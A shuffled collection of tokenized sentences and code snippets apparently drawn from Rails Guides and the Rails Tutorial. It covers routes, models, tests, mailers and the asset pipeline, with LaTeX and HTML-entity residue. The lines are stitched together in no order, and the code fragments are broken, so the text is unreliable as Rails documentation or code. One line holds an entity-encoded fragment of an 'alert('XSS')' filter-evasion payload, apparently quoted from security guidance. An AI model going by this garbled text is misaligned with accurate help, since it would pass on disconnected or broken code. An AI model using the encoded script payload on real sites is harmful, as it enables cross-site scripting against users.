If ` @ book ▖ special ? ` evaluates to `true` , Rails will start the rendering process to dump the ` @ book` variable into the `special _ show` view ▖
If you &apos;ve never used version control before , it may not be entirely clear at this point what good it does you , so let me give just one example .
# If you prefer to use mocha , flexmock or RR , uncomment the appropriate line :
create app / views / microposts / edit ▖ html ▖ erb
As mentioned briefly in Section ~ \ ref { sec : motivation } , Rails defines a special function to include stylesheets , and
The return value of `to _ param` should * * not * * be escaped :
# image _ tag ( &quot; icon ▖ png &quot; )
/ users / 1 / edit
Refactoring
Which one you use is really a matter of style and convention , but the rule of thumb is to use the simplest one that makes sense for the code you are writing .
You can run a single test through ruby ▖
The most prominent Rails IDEs are \ href { http : / / www ▖ aptana ▖ com / rails / } { RadRails } and \ href { http : / / www ▖ jetbrains ▖ com / ruby / index ▖ html } { RubyMine } .
To get them to pass , we have to create a signup page with just the right elements , arrange for the page &apos;s submission to be routed to the right place , and successfully create a new user in the database only if the resulting user data is valid .
Rails includes methods to help you validate the data that you send to models ▖ ╼
That &apos;s the file the code in the block actually writes to ▖
validates : password , length : { in : 6 ▖ ▖ 20 }
Dependent : destroy
Springify your binstubs with `bundle exec spring binstub --all` .
# # # AssetTagHelper
Note that if you want to immediately require dependencies when the engine is ╼ required , you should require them before the engine &apos;s initialization ▖
There is an analogous command for making a model : \ kode { generate model } .
assoc ▖ has _ many : invoices
The application code for email format validation uses the \ kode { format } validation , which works like this :
So first , we &apos;ll wire up the Article show template ╼ ( `app / views / articles / show ▖ html ▖ erb` ) to let us make a new comment :
Although we &apos;ll keep individual user \ kode { show } pages visible to all site visitors , the user \ kode { index } will be restricted to logged-in users so that there &apos;s a limit to how much unregistered users can see by default
* &#91; Rails 3 Remote Links and Forms : A Definitive Guide &#93; ( http : / / www ▖ alfajango ▖ com / blog / rails-3-remote-links-and-forms / )
These are covered in &#91; Testing Rails Applications &#93; ( testing ▖ html ) .
In above examples &quot; dear &quot; gets cut first , but then ` : separator` prevents it .
It also creates a minimal test for the new user page ( Listing ~ \ ref { code : user _ new _ test } ) , which should currently pass :
These helpers ╼ do exactly the same thing , mounting pieces of the engines &apos;s functionality at a ╼ pre-defined path which may be customizable .
If the route above is modified to be :
# # # # Conversion and Coercion
Option to encode `BigDecimal` objects as numbers instead of strings
Here we &apos;ve used the \ kode { toggle ! } \ method to flip the \ kode { admin } attribute from \ kode { false } to \ kode { true } .
$ bundle exec rake test ╼ ActionView : : MissingTemplate : Missing template static _ pages / about
* `collection ▖ build ( attributes = { } ) `
( Lacking the patience to wait two hours , we &apos;ll cover the third branch in a test , which is left as an exercise ( Section ~ \ ref { sec : activation _ resets _ exercises } ) ▖ )
Like sessions and account activations , password resets can be modeled as a resource despite not being Active Record objects .
These are not cause for concern ▖ )
Defaults to ` ▖ html` .
Arrays return the result of applying `to _ query` to each element with ` _ key _ &#91; &#93; ` as key , and join the result with &quot; &amp; &quot; :
http : / / www ▖ example ▖ com / users / 1 / edit
= &gt; &#91; &quot; c &quot; , &quot; g &quot; , &quot; l &quot; , &quot; k &quot; , &quot; h &quot; , &quot; z &quot; , &quot; s &quot; , &quot; i &quot; , &quot; n &quot; , &quot; d &quot; , &quot; y &quot; , &quot; u &quot; , &quot; t &quot; , &quot; j &quot; , &quot; q &quot; ,
Date ▖ new ( 2000 , 1 , 31 ) ▖ next _ month # = &gt; Tue , 29 Feb 2000
For example , you would like ` / profile` to always show the profile of the currently logged in user ▖
NOTE : By default , if you use the ` : plain` option , the text is rendered without ╼ using the current layout ▖
The method `reverse _ update` is an alias for `reverse _ merge ! ` , explained above .
Then restart the web server to incorporate the changes into the development application .
if options &#91; : counter _ cache &#93; = = true
See the next section for the preferred way to handle conditions using an array .
as seen in Listing ~ \ ref { code : microposts _ create _ action } .
resources : drafts
All you have to do is to ╼ subclass the `ActiveRecord : : Base` class and you &apos;re good to go :
&lt; % = form _ for : article , url : article _ path ( @ article ) , method : : patch do &#124; f &#124; % &gt;
Because we won &apos;t need fixtures until Chapter ~ \ ref { cha : log _ in _ log _ out } , for now we &apos;ll just remove them , leaving an empty fixtures file ( Listing ~ \ ref { code : empty _ fixtures } ) .
Tests for the user \ kode { update } action .
Now that we &apos;ve customized our site &apos;s pages and gotten a good start on the test suite , let &apos;s set the application &apos;s root route before moving on .
A test for protecting the \ kode { destroy } action .
To implement the forwarding behavior shown in Figure ~ \ ref { fig : login _ page _ protected _ mockup _ bootstrap } , we &apos;ll use a \ emph { before filter } in the Users controller .
Let &apos;s take a minute to show just one of them by renaming the application as follows :
In this case , Rails will see that ` @ magazine` is a `Magazine` and ` @ ad` is an `Ad` and will therefore use the `magazine _ ad _ path` helper ▖
&lt; script src = &quot; / assets / core ▖ js ?
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 0 ▖ beta2 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
You may have noticed in Section ~ \ ref { sec : a _ working _ follow _ button _ the _ standard _ way } that both the \ kode { create } and \ kode { destroy } actions in the Relationships controller simply redirect \ emph { back } to the original profile .
# # # # # `collection ▖ empty ?
When ╼ you are ready , you can opt into the new behavior and remove the ╼ deprecation warning by adding following configuration to your ╼ `config / application ▖ rb` :
The method `many ? ` is shorthand for `collection ▖ size &gt; 1` :
This produces :
# # # Delete
Everything in Ruby is an object .
$ rails console --sandbox
Gravatar is a free service that allows users to upload images and associate them with email addresses they control .
Note that this option was added as a security measure , to ensure user input ╼ cannot be used as locale information unless it is previously known ▖
By default , the exception is handled by responding with 406 Not Acceptable , but you can override that now ▖
No authentication .
Because several readers reported having trouble , I &apos;ve added \ kode { heroku run rake db : migrate } as a final step just to be safe .
In the \ kode { div } tag , the \ kode { hero-unit } CSS class has a special meaning to Bootstrap , as do the \ kode { btn } , \ kode { btn-large } , and \ kode { btn-primary } classes in the signup button .
To understand where this page comes from , let &apos;s start by taking a look at the Static Pages controller in a text editor , which should look something like Listing ~ \ ref { code : static _ pages _ controller } .
This is only useful if \ kode { current \ _ user } is used more than once for a single user request ; in any case , \ kode { find \ _ by } will be called at least once every time a user visits a page on the site .
Thus , the \ kode { each } method for a hash iterates through the hash one key-value \ emph { pair } at a time .
Let &apos;s break this down into pieces .
The first feature of the pipeline is to concatenate assets , which can reduce the ╼ number of requests that a browser makes to render a web page ▖
A ▖ new ▖ x = 1 # NoMethodError
Creates a standard input field of url type .
( You might see some deprecation warnings at this point , which you should ignore ▖ )
Finally , we &apos;ll mention a method for running tests directly inside Sublime Text , a technique especially useful when used in concert with Spork .
Replacing the direct comparison with the boolean method gives the code shown in Listing ~ \ ref { code : correct _ user _ before _ filter _ boolean } .
Adding the Bootstrap JavaScript library to \ kode { application ▖ js } .
ProcessVideoJob ▖ perform _ later ( Video ▖ last )
in Listing ~ \ ref { code : initial _ signin _ page } .
&#91; Hash conditions &#93; ( # hash-conditions ) provides a special syntax for specifying conditions for the joined tables :
So , if you have an API that gets real PUT requests it is going to work .
from Listing ~ \ ref { code : sign _ in _ helper } to
When documenting parts of Rails API , it &apos;s important to remember all of the ╼ pieces that go into the Rails stack .
NOTE : To help our CI servers you should add &#91; ci skip &#93; to your documentation commit message to skip build on that commit ▖
We &apos;ll call our action \ kode { hello } and place it in the Application controller .
Contents of the sample app &apos;s \ kode { config } directory ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / config _ directory _ rails _ 4-full ▖ png } { ( full size ) }
Not all clients prefer HTML emails , ╼ and so sending both is best practice ▖
Setting up a production site to use SSL involves purchasing and configuring an \ emph { SSL certificate } for your domain .
We &apos;ll then create our first Rails application , called \ kode { hello \ _ app } .
&lt; td &gt; &lt; % = article ▖ title % &gt; &lt; / td &gt;
On some systems you might have to restart the web server ( using Ctrl-C ) for the changes to take effect .
= &gt; &#91; &quot; f &quot; , &quot; w &quot; , &quot; i &quot; , &quot; a &quot; , &quot; h &quot; , &quot; p &quot; , &quot; c &quot; , &quot; x &quot; &#93;
Taken together , the material in Chapter ~ \ ref { cha : modeling _ users } through Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } develops a full Rails login and authentication system .
params ▖ require ( : comment ) ▖ permit ( : commenter , : body )
Adding account activation to the user signup test ▖
&lt; h1 &gt; Contacts &lt; / h1 &gt;
A mockup of the user edit page .
To change the default mailer view for your action you do something like :
In all three cases , observe that each micropost display indicates the time since it was created ( e ▖ g ▖ , ``Posted 1 minute ago ▖ &apos; &apos; ) ; this is the work of the \ kode { time \ _ ago \ _ in \ _ words } method from Listing ~ \ ref { code : micropost _ partial } .
&#124; &#124; 101 &#124; : switching _ protocols &#124;
Note that , since it is the page for a new session , the signin page lives in the file \ kode { app / views / sessions / new ▖ html ▖ erb } , which we have to create .
The Home page after deleting the second-most-recent micropost .
\ chapter { From zero to deploy } % ( fold ) ╼ \ label { cha : beginning } ╼ ╼
&lt; / select &gt;
# # # Test Coverage
As JSON Patch was only recently made into an RFC , there aren &apos;t a lot of great ╼ Ruby libraries yet ▖
def middleware
After you create the blog application , switch to its folder :
We can mix and match `scope` and `where` conditions and the final sql ╼ will have all conditions joined with `AND` .
as seen in Listing ~ \ ref { code : allow _ blank _ password } .
To examine the relationship between the Users controller and the User model , let &apos;s focus on a simplified version of the \ kode { index } action , shown in Listing ~ \ ref { code : demo _ index _ action } .
In this chapter , we will complete the REST actions for the Users resource ( Table ~ \ ref { table : RESTful _ users } ) by adding \ kode { edit } , \ kode { update } , \ kode { index } , and \ kode { destroy } actions .
* ` : less _ than _ or _ equal _ to` - Specifies the value must be less than or equal the ╼ supplied value ▖
&lt; % = form _ tag ( &apos; / articles &apos; , remote : true ) do % &gt;
# Use jquery as the JavaScript library
One reason is to catch implementation errors , as discussed in a moment .
When accessing the engine through `http : / / localhost : 3000 / blog` , the ╼ articles will be empty ▖
Sat , 22 Sep 2012 23 : 59 : 59 UTC + 00 : 00
* A layout view template for the engine
@ assembly = @ part ▖ assemblies ▖ find ( 1 )
&quot; SSLError &quot; ▖ underscore ▖ camelize # = &gt; &quot; SSLError &quot;
It &apos;s time to create the form for a new article .
We pass the named route as the ╼ second argument , and then the options as another argument ▖
To set up the application to use Cucumber , we next generate some necessary support files and directories :
% w ( foo bar baz ) ▖ sum # = &gt; &quot; foobarbaz &quot;
require &apos; active _ support / core _ ext&apos;
The `require` ╼ directive is used to tell Sprockets the files you wish to require ▖
If you have a `config / database ▖ yml` but no `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` then this file will be used to connect to your database :
The resulting cleaned-up views appear in Listing ~ \ ref { code : home _ view _ interior } , Listing ~ \ ref { code : help _ view _ interior } , and Listing ~ \ ref { code : about _ view _ interior } .
You could do :
t ▖ text : body
( In this sense , \ kode { respond \ _ to } is more like an if-then-else statement than a series of sequential lines ▖ )
With partials , you can extract pieces of code from your templates to separate files and also reuse them throughout your templates .
╼ = &gt; -1
* Running `rake doc : guides` will put a full copy of the Rails Guides in the ╼ `doc / guides` folder of your application ▖
&lt; th colspan = &quot; 3 &quot; &gt; &lt; / th &gt;
# slashes ▖
This custom store must be defined as `ActionDispatch : : Session : : MyCustomStore` .
You can define your own custom environments as well ; see the \ href { http : / / railscasts ▖ com / episodes / 72-adding-an-environment } { RailsCast on adding an environment } for details .
Rails generally stays close to the latest released Ruby version when it &apos;s released :
# = &gt; { &quot; &quot; = &gt; nil , &quot; 1 &quot; = &gt; 1 , &quot; nested &quot; = &gt; { &quot; a &quot; = &gt; 3 , &quot; 5 &quot; = &gt; 5 } }
create app / assets / javascripts / users ▖ js ▖ coffee
The method for authenticating users will be to take a submitted password , hash it , and compare the result to the hashed value stored in the database .
M = X : : Y : : Z
With all the work making templates for user microposts in Section ~ \ ref { sec : augmenting _ the _ user _ show _ page } , the ending was rather anticlimactic .
Let &apos;s get to it .
Passing `true` to the ` : polymorphic` option indicates that this is a polymorphic association ▖
* In Rails 4 ▖ 0 , precompiling assets no longer automatically copies non-JS / CSS assets from `vendor / assets` and `lib / assets` ▖
/ / = require jquery _ ujs
Rails comes with sensible default manifest files , and in the \ emph { Rails Tutorial } we won &apos;t need to make any changes , but the \ href { http : / / guides ▖ rubyonrails ▖ org / asset _ pipeline ▖ html } { Rails Guides entry on the asset pipeline } has more detail if you need it .
This would add something like &quot; Process data files ( 0 ▖ 34523 ) &quot; to the log , which you can then use to compare timings when optimizing your code .
&amp; # 108 ; &amp; # 101 ; &amp; # 114 ; &amp; # 116 ; &amp; # 40 ; &amp; # 39 ; &amp; # 88 ; &amp; # 83 ; &amp; # 83 ; &amp; # 39 ; &amp; # 41 ; &gt;
Open the `app / views / welcome / index ▖ html ▖ erb` file in your text editor ▖
With the association thus made , we can update the \ kode { setup } method in Listing ~ \ ref { code : micropost _ validity _ test } with the idiomatically correct way to build a new micropost , as shown in Listing ~ \ ref { code : micropost _ validity _ test _ idiomatic } .
&lt; script &gt;
select _ datetime ( )
By using an email address as the username , we open the possibility of communicating with our users at a future date ( Chapter ~ \ ref { cha : account _ activation _ and _ password _ reset } ) .
# &lt; contributor &gt;
In addition , although it &apos;s unlikely ever to be a problem , there &apos;s a chance that a user &apos;s email address could overrun the maximum length of strings , which for many databases is 255 .
&lt; td &gt; &lt; % = b % &gt; &lt; / td &gt;
Brevity is a plus : get to the point .
options = args ▖ extract _ options !
This method receives a hash with keys ` : years` , ` : months` , ` : weeks` , ` : days` , ` : hours` , ` : minutes` , and ` : seconds` , and returns a datetime advanced as much as the present keys indicate .
With this template in place , we can generalize the method by adding a function argument with the name of the digest , and then use string interpolation as above :
If it fails , we simply fall back on the behavior developed in Section ~ \ ref { sec : signup _ failure } .
As long as you start your symbols with a letter and stick to normal word characters , you should be fine .
Change the content of the \ kode { hello } action in Listing ~ \ ref { code : hello _ action } to read ``hola , mundo ! &apos; &apos;
content _ type : &quot; text / plain &quot; ,
And when we &apos;re writing application code that isn &apos;t particularly brittle or error-prone , or is likely to change ( as is often the case with views ) , we &apos;ll often skip testing altogether .
It &apos;s time to add a second model to the application ▖
The cloud IDE ( Section ~ \ ref { sec : development _ environment } ) includes such a line by default .
Code to get a passing test for the Home page .
has _ many : invoices , dependent : : destroy
By following this pattern , we can arrange to display the contents of the flash site-wide using code like this :
The final piece of the relationships puzzle is to add a \ kode { user ▖ followers } method to go with \ kode { user ▖ followed \ _ users } .
\ emph { Strings } are probably the most important data structure for web applications , since web pages ultimately consist of strings of characters sent from the server to the browser .
root to : &apos; pages # main&apos;
To be able to contribute code , you need to clone the Rails repository :
The result appears in Listing ~ \ ref { code : remember _ method }
in Listing ~ \ ref { code : password _ reset _ update _ action } .
class ProductsController &lt; ApplicationController
Now the behavior is clear , that we are only using the connection information in `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` .
NoMethodError : undefined method `to _ a &apos; for 9 : Fixnum
The user index \ href { http : / / localhost : 3000 / users } { / users } with delete links ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / index _ delete _ links _ rails _ 3 _ bootstrap-full ▖ png } { ( full size ) }
With the asset pipeline , in production all the application stylesheets get rolled into one CSS file ( \ kode { application ▖ css } ) , all the application JavaScript code gets rolled into one JavaScript file ( \ kode { javascripts ▖ js } ) , and all such files ( including those in \ kode { lib / assets } and \ kode { vendor / assets } ) are \ emph { minified } to remove the unnecessary whitespace that bloats file size .
assemblies ( force _ reload = false )
That is used by Active Record in its support for range values in conditions .
If you &apos;re new to object-oriented programming , this may sound like gibberish , so let &apos;s look at some concrete examples .
* `collection ▖ create ( attributes = { } ) `
╼ \ end { code } ╼ ╼ \ subsection { The basic model } % ( fold ) ╼ \ label { sec : the _ basic _ model } ╼ ╼
Note that this means unchecking the box will log out the user on all browsers on all computers .
The Spring server is still a little quirky as of this writing , and sometimes Spring \ emph { processes } will accumulate and slow performance of your tests .
Now it &apos;s time to add an About page to our application .
create app / models / micropost ▖ rb
Client ▖ joins ( : orders ) ▖ where ( orders : { created _ at : time _ range } )
Listing ~ \ ref { code : signup _ with _ account _ activation _ test } also uses the \ kode { assigns } method for the first time in the main tutorial ; as explained in the Chapter ~ \ ref { cha : log _ in _ log _ out } exercise ( Section ~ \ ref { sec : log _ in _ out _ exercises } ) , \ kode { assigns } lets us access instance variables in the corresponding action .
All we &apos;ve done so far is write some plain text , so it shouldn &apos;t be surprising that the Cucumber scenarios aren &apos;t yet passing .
= &gt; BasicObject
You can use the `includes` method to specify second-order associations that should be eager-loaded when this association is used ▖
* The routing parameters for the route
in the feature file are handled by these steps :
This is because the code
We saw in Figure ~ \ ref { fig : new _ signup _ page } ( shown again in Figure ~ \ ref { fig : blank _ signup _ page _ recap } ) that the signup page is currently blank : useless for signing up new users .
The syntax is simple , relying on Ruby blocks and custom methods to define the attributes of the desired object .
The changes we &apos;ll test for are the rendering of the user &apos;s profile page ( as determined by the page title , which should be the user &apos;s name ) , together with three planned changes to the site navigation :
Find more details on &#91; Rosario Valotta &apos;s paper &#93; ( http : / / www ▖ xssed ▖ com / news / 37 / Nduja _ Connection _ A _ cross _ webmail _ worm _ XWW / ) ▖
In addition to the model , Rails has also made a migration to create the ╼ corresponding database table :
class B
The method here is to make a user with the same email address as \ kode { @ user } , which we accomplish using \ kode { @ user ▖ dup } , which creates a duplicate user with the same attributes ▖ Since we then save that user , the original \ kode { @ user } has an email address that already exists in the database , and hence should not be valid .
If you now go to &lt; http : / / localhost : 3000 / articles / new &gt; you &apos;ll * almost * be able ╼ to create an article ▖
What the `create` action should ╼ be doing is saving our new article to the database .
validates : token , presence : true , uniqueness : true , strict : TokenGenerationException
In case of collision the key in the hash of the argument wins in `merge` ▖
This code is responsible for inserting the contents of each page into the layout .
The result appears in Listing ~ \ ref { code : microposts _ destroy _ action }
In this mode all ╼ requests for assets in the pipeline are handled by Sprockets directly .
In addition , the destroyed object still exists in memory :
If you refresh &lt; http : / / localhost : 3000 / articles / new &gt; now , you &apos;ll get a new error :
Custom session stores can also be specified :
To get started with the Ruby installation , first \ href { http : / / rvm ▖ io / rvm / install / } { install RVM } :
&lt; % = javascript _ include _ tag &quot; application &quot; , &quot; data-turbolinks-track &quot; = &gt; true % &gt;
in Listing ~ \ ref { code : from _ users _ followed _ by _ first _ cut } .
This method determines if a given password is valid for a particular user by computing its digest and comparing the result to \ kode { password \ _ digest } in the database .
isolate _ namespace Blorgh
Active Support provides a better implementation of `to _ json` than the `json` gem ordinarily provides for Ruby objects ▖
The User model with an added \ kode { admin } boolean attribute .
Undoing things
Client ▖ find _ or _ create _ by ( first _ name : &apos; Andy &apos; ) do &#124; c &#124;
# # # # Options for `has _ many`
You probably don &apos;t want to just sit there with a filled out ` &lt; form &gt; ` , though ▖ ╼
If you reload ╼ &lt; http : / / localhost : 3000 / articles / new &gt; and ╼ try to save an article without a title , Rails will send you back to the ╼ form , but that &apos;s not very useful ▖
You will also be ready to benefit from the many more advanced books , blogs , and screencasts that are part of the thriving Rails educational ecosystem .
Verify that it is correctly installed and in your PATH :
Git remote heroku added
Computes the path to a JavaScript asset in the `app / assets / javascripts` directory ▖
Once it &apos;s been installed , you can simply drop a reference to the console helper ( i ▖ e ▖ , ` &lt; % = console % &gt; ` ) into any view you want to enable it for ▖
There are many options for \ href { http : / / lmgtfy ▖ com / ? q = rails + enforce + password + strength } { enforcing password strength in Rails } , but for simplicity we &apos;ll just enforce a minimum length and the requirement that the password not be blank .
TODO ▖ ▖ .
COM THE _ US-ER @ foo ▖ bar ▖ org first ▖ last @ foo ▖ jp &#93;
As an additional security precaution , we &apos;ll also plan to \ emph { expire } the reset link after a couple of hours , which requires recording the time when the reset gets sent .
A test of the ``remember me &apos; &apos; checkbox ▖
&lt; % = link _ to &quot; New book &quot; , new _ book _ path % &gt;
Generally we want our Rails server ╼ to tell our CDN ( and browser ) that the asset is &quot; public &quot; , that means any cache ╼ can store the request ▖
This can be overridden on a per-email basis .
# # # Combining Validation Conditions
email = michael % 40michaelhartl ▖ com &quot; &gt; Reset password &lt; / a &gt; ╼ ╼ &lt; p &gt; This link will expire in two hours ▖ &lt; / p &gt; ╼ ╼ &lt; p &gt; ╼ If you did not request your password to be reset , please ignore this email and ╼ your password will stay as it is .
Listing ~ \ ref { code : followers _ test } adds only one line to the test from Listing ~ \ ref { code : utility _ method _ tests } , but so many things have to go right to get it to pass that it &apos;s a very sensitive test of the code in Listing ~ \ ref { code : has _ many _ following _ through _ passive _ relationships } .
Note that the default error messages are plural ( e ▖ g ▖ , &quot; is too short ( minimum ╼ is % { count } characters ) &quot; ) ▖
By the way , previous versions of Rails used \ texttt { PUT } in place of \ texttt { PATCH } , and Rails ~ 4 ▖ 0 still supports this usage , but \ texttt { PATCH } \ href { http : / / weblog ▖ rubyonrails ▖ org / 2012 / 2 / 26 / edge-rails-patch-is-the-new-primary-http-method-for-updates / } { matches the intended HTTP usage better } and is preferred for new applications .
email
Rails provides two methods that address this problem by dividing records into memory-friendly batches for processing ▖
This helper validates that the specified attributes are not empty ▖
&lt; ul &gt;
: videojobs
Here the first argument is the migration name , and we &apos;ve also supplied a second argument with the name and type of attribute we want to create .
message : &quot; only allows letters &quot; }
You can also pass local variables into partials , making them even more powerful and flexible ▖
After restarting the development server to activate the configuration in Listing ~ \ ref { code : development _ email _ settings } , we next need to update the User mailer \ emph { preview file } , which was automatically generated in Section ~ \ ref { sec : account _ activation _ mailer } , as shown in Listing ~ \ ref { code : generated _ user _ mailer _ previews } .
Person ▖ create ( name : nil ) ▖ valid ?
The `isolate _ namespace` method here deserves special notice ▖
Of course , it &apos;s never a bad idea to take a look at the page in a browser to make sure our tests aren &apos;t completely crazy ( Figure ~ \ ref { fig : about _ us } ) .
The incorrect flash behavior is a minor bug in our application .
In previous versions of Rails , using
Because security is a top priority , err on the side of writing tests of the security model first .
We &apos;ll also add a way to \ emph { authenticate } a user based on a given password , a method we &apos;ll use in Chapter ~ \ ref { cha : basic _ login } to allow users to log in to the site .
{ &quot; action &quot; = &gt; &quot; create &quot; , &quot; controller &quot; = &gt; &quot; people &quot; , &quot; person &quot; = &gt; { &quot; first _ name &quot; = &gt; &quot; William &quot; , &quot; last _ name &quot; = &gt; &quot; Smith &quot; } }
( This \ kode { follow ! } \ method should always work , so , as with \ kode { create ! } \ and \ kode { save ! } , we indicate with an exclamation point that an exception will be raised on failure ▖ )
create app / assets / stylesheets / scaffolds ▖ css ▖ scss
The time has finally come to add a second such resource : user \ emph { microposts } , which are short messages associated with a particular user
* If `value` is a callable object it must expect one or two arguments ▖
Next , we need to include CarrierWave &apos;s \ href { https : / / github ▖ com / minimagick / minimagick } { MiniMagick } interface for ImageMagick , together with a resizing command .
In the case of users and microposts , this process is straightforward , since they are naturally resources in their own right .
By focusing on high-level functionality---verifying that users can sign in , stay signed in from page to page , and can sign out---we test the core application code without focusing on less important details .
When in doubt , it is best to consult a Rails team member before backporting your changes to avoid wasted effort .
To do this , you &apos;ll need to generate a comment ╼ model , a comment controller and then modify the articles scaffold to display ╼ comments and allow people to create new ones .
If you want to define the singular form of a resource , you should add additional rules to the `Inflector` :
Whether you included the configuration in Listing ~ \ ref { code : irbrc } , you can start the console at the command line as follows :
Client ▖ unscoped ▖ load
Using plain Ruby you can wrap methods with other methods , that &apos;s called _ alias chaining _ .
# If you change this key , all old signed cookies will become invalid !
looks like it might have to pull all the followed users out of the database to apply the \ kode { include ? } \ method , but in fact for efficiency Rails arranges for the comparison to happen directly in the database .
A test for presence of the \ kode { email } attribute .
▖ gitignore
I prefer to use the \ kode { shared } folder for utility partials that are useful on multiple views , while putting partials that are literally on every page ( as part of the site layout ) in the \ kode { layouts } directory .
M ▖ parents # = &gt; &#91; X : : Y , X , Object &#93;
( You might also consider the \ href { http : / / www ▖ codeschool ▖ com / courses / testing-with-rspec } { RSpec course at Code School } , which one reader has said answered a lot of his RSpec questions ▖ )
The ╼ second time we run this code , the block will be ignored .
&lt; % = asset _ path ( &apos; smile ▖ png &apos; ) % &gt;
Note in the last example that we &apos;ve defined an \ kode { attribute } variable equal to the symbol \ kode { : activation } and used string interpolation to build up the proper argument to \ kode { send } .
password _ field _ tag &apos; pass&apos;
On Linux , the default terminal is fine .
Here \ kode { user ▖ authenticate } returns \ kode { false } for invalid password .
in Listing ~ \ ref { code : annotated _ title _ helper } .
&quot; User &quot; ▖ foreign _ key ( false ) # = &gt; &quot; userid &quot;
# # # Generating a Comments Resource
( It &apos;s probably a good idea to write a test for the flash as well , which is left as an exercise ( Section ~ \ ref { sec : exercises _ the _ flash } ) ▖ )
The News views will use the new layout , hiding the top menu and adding a new right menu inside the &quot; content &quot; div .
\ label { fig : bitbucket _ repository _ page } } ╼ \ end { figure } ╼ ╼ ╼ \ subsection { Branch , edit , commit , merge } ╼ \ label { sec : git _ commands } ╼ ╼
Because the material in this chapter is particularly challenging , before writing any code we &apos;ll pause for a moment and take a tour of the interface .
render action : : edit
The idiomatically correct way to do this is to use Active Record \ emph { associations } , which we &apos;ll implement in Section ~ \ ref { sec : user _ micropost _ associations } , but for now we &apos;ll work with the \ kode { Micropost } model directly .
We &apos;re now ready to cover the &quot; D &quot; part of CRUD , deleting articles from the ╼ database ▖
This allows `except` to play nice with hashes with indifferent access for instance :
To add the new webserver , we simply follow the \ href { https : / / devcenter ▖ heroku ▖ com / articles / rails-Puma } { Heroku Puma documentation } .
If you &apos;re using the cloud IDE or another Unix-like system , you can accomplish this with the \ kode { curl } utility as follows
Rails determines the name of the partial to use by looking at the model name in the collection , `Product` in this case ▖
* `config ▖ active _ support ▖ escape _ html _ entities _ in _ json` enables or disables the escaping of HTML entities in JSON serialization ▖
GROUP BY status
( Here we &apos;ve used the Rails convention of \ kode { user } instead of \ kode { user ▖ id } in the condition ; Rails automatically uses the ~ \ kode { id } .
The check ╼ is now done automatically when you `require &apos; rails / test _ help &apos; ` , although ╼ leaving this line in your helper is not harmful in any way .
Durations can be added to and subtracted from datetimes :
A mockup of the user profile made in this section ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / profile _ mockup _ profile _ name _ bootstrap-full ▖ png } { ( full size ) }
&lt; th &gt; Text &lt; / th &gt;
We will use this more compact style whenever possible when developing the rest of the sample application .
By writing a \ emph { failing } test first and then implementing the application code to get it to pass , we increase our confidence that the test is actually covering the functionality we think it is .
* &#91; reSRC &apos;s List of Free Programming Books &#93; ( http : / / resrc ▖ io / list / 10 / list-of-free-programming-books / # ruby )
You &apos;ll see how to do this later in this ╼ guide .
The question mark syntax is fine , but when we want the \ emph { same } variable inserted in more than one place , the second syntax is more convenient .
&#124; Middleware &#124; Purpose &#124;
Most of the secure password machinery will be implemented using a single Rails method called \ kode { has \ _ secure \ _ password } , which we &apos;ll include in the User model as follows :
The Home page with a working status feed .
As noted in Section ~ \ ref { sec : a _ hashed _ password } , \ kode { has \ _ secure \ _ password } automatically adds an \ kode { authenticate } method to the corresponding model objects .
If the receiver responds to `convert _ key` , the method is called on each of the arguments ▖
create app / views / microposts
# # # Ruby Versions
# = &gt; { : a = &gt; 0 , : b = &gt; 1 , : c = &gt; 2 }
As of this writing the only supported non-default format is ` : db` :
will raise a \ kode { NoMethodError } exception .
* Applies human inflection rules to the argument .
Unlike the login functionality , which we use in both Listing ~ \ ref { code : log _ in _ success } and Listing ~ \ ref { code : login _ upon _ signup } , we &apos;ll only be logging out in one place , so we &apos;ll put the relevant code directly in the \ kode { destroy } action .
&lt; target option = &quot; fast &quot; name = &quot; compile &quot; / &gt;
In Chapter ~ \ ref { cha : sign _ up } , we &apos;ll give users the ability to sign up for our site and create a user profile page .
page to list all microposts
Running the Rails server on a local machine .
By default , Rails retrieves all columns .
( It &apos;s actually at 78 columns , which gives you a little margin for error ▖ )
Article ▖ many ?
To ╼ add this , put this line underneath the call to `render @ article ▖ comments` in ╼ `app / views / blorgh / articles / show ▖ html ▖ erb` :
These manifest files contain _ directives _ - instructions that tell Sprockets ╼ which files to require in order to build a single CSS or JavaScript file ▖
The method `Hash ▖ deep _ dup` duplicates itself and all keys and values ╼ inside recursively with Active Support method `Object # deep _ dup` ▖
alert &quot; page has loaded ! &quot;
A diagram of this inheritance hierarchy appears in Figure ~ \ ref { fig : string _ inheritance _ ruby _ 1 _ 9 } .
* `config ▖ action _ view ▖ erb _ trim _ mode` gives the trim mode to be used by ERB ▖
To specify a dependency that should only be installed as a development ╼ dependency of the application , specify it like this :
The corresponding migration might look like this :
* `updated _ at` - Automatically gets set to the current date and time whenever ╼ the record is updated .
But this expression doesn &apos;t explain the \ texttt { &#124; &#124; = } notation as well , so the above discussion uses the nearly equivalent \ texttt { @ foo = @ foo &#124; &#124; &quot; bar &quot; } ▖ )
# # # # The Easy Way
You can specify a full path relative to the document root , or a URL , if you prefer ▖
Finally , Figure ~ \ ref { fig : user _ profile _ microposts } shows the \ emph { second } page of microposts for the first user , along with the pagination links at the bottom of the display .
&#124; &#124; 410 &#124; : gone &#124;
Let &apos;s ╼ assume that we have a list of articles that can be deleted with just one ╼ click ▖
To retrieve objects from the database , Active Record provides several finder methods ▖
belongs _ to : comment
If you find an
The user profile page with code for microposts---but no microposts ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / user _ profile _ no _ microposts _ bootstrap-full ▖ png } { ( full size ) }
Tests for the Follow / Unfollow button .
However , up to the current version 3 ▖ 0 ▖ 4 , it is still vulnerable to XSS ▖
as shown in Listing ~ \ ref { code : bootstrap _ config } .
Because we &apos;ll end up using the same database table for both active and passive relationships , we &apos;ll use the generic term \ emph { relationship } for the table name , with a corresponding Relationship model .
It &apos;s normal for associations to work in two directions , requiring declaration on two different models :
# # # Updating the Schema
Adding a mapping for the root route .
$ git rebase master
By modifying the user information and clicking the Update User button , we arrange to change the information for the user in the toy application ( Figure ~ \ ref { fig : demo _ update _ user _ rails _ 3 } ) .
# # # # select _ datetime
